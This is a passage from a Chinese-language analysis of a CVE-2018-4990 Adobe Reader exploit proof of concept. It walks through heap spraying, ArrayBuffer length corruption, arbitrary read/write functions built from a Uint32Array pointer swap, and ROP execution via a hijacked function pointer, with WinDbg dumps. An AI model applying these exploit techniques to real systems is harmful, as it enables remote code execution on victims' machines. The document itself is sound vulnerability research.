可以看到, 0x0d0f0048 的大小位置被修改成了 0x66666666, 这样我们就获得了一个能访问很大范围的 ArrayBuffer. 接着 POC
找到这个大小 为 0x66666666 的块, 用它创建一个 DataView.

接着到如下代码:

    
    
    for(var i2 = 1;i2<0x10;i2++) {
        arr1[i2] = new Uint32Array(sprayarr[i1+i2]);
        arr1[i2][0] = i2;
    }
    

这里 i1 就是当初分配那些 0x10000 - 24 大小的块时, 0x0d0f0048 这个块在 sprayarr 中的中索引,
这里用该索引后面的块创建 Uint32Array, 并将第一个元素设置为索引值(这里可以用前面插入代码获取对象地址的方法查看 sprayarr
中相应位置的对象).

接下来执行到如下代码:

    
    
    for(var i2=0x30000;i2<0x10000*0x10;i2=i2+4) {
        if( biga.getUint32(i2,true)==spraylen && biga.getUint32(i2+4,true) > spraypos  )
            ...
    

这里通过前面长度为 0x66666666 的块获取查找两个值, 这里调用 getUint32 时, i2 作为偏移, 而基址是这个大块的地址, 也就是
0x0d0f0058(0x0d0f0048 是堆 UserPtr, 使用从偏移 0x10 字节开始). 这里其实是从 0x0d0f0048 这个块后面偏移
0x30000 开始, 也就是其它的一些大小为 0x10000 - 24 的块开始查找(通过之前的方法可以测试得知, sprayarr
中的块按索引是连续的, 也就是说比如 i1 是 0x0d0f0048 块的索引, 那么 i1 + 1 处的块地址是 0x0d100048). 这里就是从
sprayarr[i1] 后面的第三个块开始, 此时我们可以在 if 块里增加打印 i2 值的代码, 看看匹配条件时 i2 的值是多少, 这里获得 i2
值是 0x3fff4, 我们在 Windbg 计算查看一下该处的值是什么:

    
    
    0:012> dd 0x0d0f0058 + 0x3fff4
    0d13004c  0000ffe8 1b297138 00000000 00000004
    0d13005c  00000000 00000000 00000000 00000000
    0d13006c  00000000 00000000 00000000 00000000
    0d13007c  00000000 00000000 00000000 00000000
    0:012> dd 1b297138 
    1b297138  066b2b68 06625c00 00000000 66f89128
    1b297148  00000000 00000000 00000000 ffffff81
    1b297158  0000ffe8 ffffff81 087c0b40 ffffff87
    1b297168  00000000 00000000 00000002 00000000
    1b297178  00003ffa ffffff81 00000005 ffffff81
    1b297188  0d130058 00000000 066b2b68 06625c00
    

我们可以看到, 这是第一元素被写为 4 的大小为 0x10000 - 24 的块(第一个元素实在填充 arr1 的循环中写入的), 通过用地址减去
0x0d0f0058 也可知道这是 0x0d0f0058 后面的第四个块, 这里比较的两个值第一个是块长度, 第二个此时不知道什么意思, 不过看 dump
出的内存很眼熟, 应该是 Uint32Array 对象的结构, 猜测是指向 Uint32Array 的指针, 因为在填充 arr1 的循环中用这些
ArrayBuffer 创建了 Uint32Array, 所以这里赋了这个值. 这里我们在前面填充 arr1 的循环后面插入如下代码验证一下:

    
    
    var my_array = new Array(0x10);
    my_array[0] = 0x23badbad;
    my_array[1] = sprayarr[i1 + 1];
    my_array[2] = sprayarr[i1 + 2];
    my_array[3] = arr1[1];
    my_array[4] = arr1[2];
    app.alert("23333333333");
    

弹框后附加查看:

    
    
    0:012> s -d 0x10000 L?7fffffff 0x23badbad
    1834d9b8  23badbad ffffff81 087c0978 ffffff87  ...#....x.|.....
    0:012> dd 1834d9b8  Lc
    1834d9b8  23badbad ffffff81 087c0978 ffffff87
    1834d9c8  087c0a10 ffffff87 1b297030 ffffff87
    1834d9d8  1b297088 ffffff87 066ee420 ffffff87
    0:012> dd 087c0978 Lc
    087c0978  066b2b20 06625be0 00000000 0d100058
    087c0988  00000000 00000000 00000000 00000004
    087c0998  087a2818 00000000 00000000 00000000
    0:012> dd 0d100058 - 10 Lc 
    0d100048  00000000 0000ffe8 1b297030 00000000
    0d100058  00000001 00000000 00000000 00000000
    0d100068  00000000 00000000 00000000 00000000
    0:012> dd 087c0a10 Lc
    087c0a10  066b2b20 06625be0 00000000 0d110058
    087c0a20  00000000 00000000 00000000 00000004
    087c0a30  087a2818 00000000 00000000 00000000
    0:012> dd 0d110058 - 10 Lc
    0d110048  00000000 0000ffe8 1b297088 00000000
    0d110058  00000002 00000000 00000000 00000000
    0d110068  00000000 00000000 00000000 00000000
    

可以看到, 创建了 Uint32Array 的 ArrayBuffer 的块长度后面的指针就是相应 Uint32Array 对象的地址.
接着执行下面的代码:

    
    
    mydv = biga;
    var itmp = mydv.getUint32(i2+12,true);
    myarray = arr1[itmp];
    mypos = biga.getUint32(i2+4,true) - spraypos +0x50;
    mydv.setUint32(mypos-0x10,0x100000,true);
    myarraybase = mydv.getUint32(mypos,true);
    

这里首先获取 i2 + 12 偏移处的值, 从前面的内存我们可以知道, 这里获取的是写入的索引 4, 然后用索引获取 arr1 中相应的
Uint32Array 对象. 然后计算一个该 Uint32Array 对象的地址到 0x0d0f0058 的偏移, 接着使用 setUint32 修改该
mypos - 0x10, 我们知道, 这里访问时是访问的 0x0d0f0058 + mypos - 0x10, 其实就是修改该的 Uint32Array
对象偏移 0x40 处的值, 我们查看一个 Uint32Array 对象可以知道, 这里正常情况下是元素的个数, 也就是总字节数 / 4 后的值,
这里将其修改为 0x100000. 然后再获取 Uint32Array 对象偏移 0x50 处的值给 myarraybase,
该处的值是实际存储数据的指针, 此时此刻, 这个 Uint32Array 对象该处存的指针就是写入索引 4 的那块内存.

然后接下来的操作就是通过下面两个函数了:

    
    
    function myread(addr) {
        mydv.setUint32(mypos,addr,true);
        var res = myarray[0];
        mydv.setUint32(mypos,myarraybase,true);
        return res;
    }
    function mywrite(addr,value) {
        mydv.setUint32(mypos,addr,true);
        myarray[0] = value ;
        mydv.setUint32(mypos,myarraybase,true);
    }
    

这里读取时, 首先将 Uin32Array 对象的实际存储数据指针替换为指定地址, 然后直接访问, 这样就获取了该地址处的值,
最后再写入原实际存储数据指针值. 写入时原理相同, 都是通过替换实际存储数据指针来完成的.

有了读写函数, 接下来 POC 通过这两个函数获取计算 Escript 模块的基址, 然后布局 ROP. 最后通过修改 bookmarkRoot
的一个函数指针执行 ROP. 这里我们断在 ROP 第一个地址, 也就是下面代码计算的地址:

    
    
    mywrite(objescript+0x598,offset("sp1")-0x640c0000+dll_base);
    

断下后, 首先推测是通过函数调用过来的, 这里我们看下:

    
    
    0:000> ub poi(esp) L8
    EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x5aad8:
    66ae18e3 50              push    eax
    66ae18e4 e8e466f9ff      call    EScript!mozilla::HashBytes+0x4794f (66a77fcd)
    66ae18e9 59              pop     ecx
    66ae18ea 85c0            test    eax,eax
    66ae18ec 740f            je      EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x5aaf2 (66ae18fd)
    66ae18ee 50              push    eax
    66ae18ef a1548dc766      mov     eax,dword ptr [EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xab830 (66c78d54)]
    66ae18f4 ff9098050000    call    dword ptr [eax+598h]
    

可以看到, 确实是通过函数调用过来的, 这里从 EScript 的一个地址处获得一个值, 并调用偏移 0x598 处的函数, 这下就能理解 POC
里面的操作什么意思了. 最后, POC 里的 Shellcode 有问题, 会导致奔溃, 主要原因是在如下代码中:

    
    
    for(var i2=0;i2< rop1.length ;i2=i2+1) {
        myarray[i2+3] = rop1[i2] >  0x640c0000 ?(rop1[i2] - 0x640c0000 +dll_base):rop1[i2];
    }
    myarray[i2+3-2] = 0x90909090;
    for(var i3=0;i3< dlldata.length ;i3=i3+1)
    

这里在设置 ROP 时, 判断是否大于 0x640c0000, 大于就减去并加模块基址, 但是 ROP 里有个 0x90909090, 本意是滑块指令,
但是写入时却被改变, 导致执行指令时异常导致奔溃.

## 参考

> [Taking apart a double zero-day sample discovered in joint hunt with
> ESET](https://cloudblogs.microsoft.com/microsoftsecure/2018/07/02/taking-> apart-a-double-zero-day-sample-discovered-in-joint-hunt-with-eset/)
>
> [CVE-2018-4990 POC](https://github.com/smgorelik/Windows-RCE-> exploits/tree/master/Documents/Acrobat)
>
> [CVE-2018-4990 Adobe Reader
> 代码执行漏洞利用分析](https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/)
>
> [CVE-2018-4990 Acrobat
> Reader堆内存越界访问释放漏洞分析](https://bbs.pediy.com/thread-226971.htm)

*本文作者：

